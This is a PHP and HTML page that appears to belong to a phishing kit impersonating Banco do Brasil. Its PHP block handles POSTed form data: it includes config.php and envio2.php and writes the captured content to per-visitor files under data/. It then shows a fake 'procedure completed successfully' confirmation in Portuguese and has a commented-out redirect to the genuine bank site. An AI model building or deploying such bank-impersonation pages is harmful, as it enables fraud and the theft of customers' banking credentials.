<?php


if ($_POST){
	include("config.php");
	include("envio2.php");
	@file_put_contents("data/$ip.html", $conteudo, FILE_APPEND);	

}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Banco do Brasil</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
	<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
	<link rel="stylesheet" type="text/css" href="reset.css" />
	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<link rel="stylesheet" type="text/css" href="style.css?id=001" />
</head>
<body>
	<div class="container">
		<div class="topo"><p>Procedimento concluído</p></div>
		<div class="content">

			<table>
				<tr>
					<td><span class="titulo-preto">BB: <br><br> Procedimento realizado com sucesso, agradecemos sua compreensão.  </span></td>
				</tr>

			</table>
		</div>

	</div>

	<script type="text/javascript">
		/*
			setTimeout(function(){
				window.location.replace("https://www.bb.com.br");
			}, 3000);		
		*/
	</script>

</body>
</html>
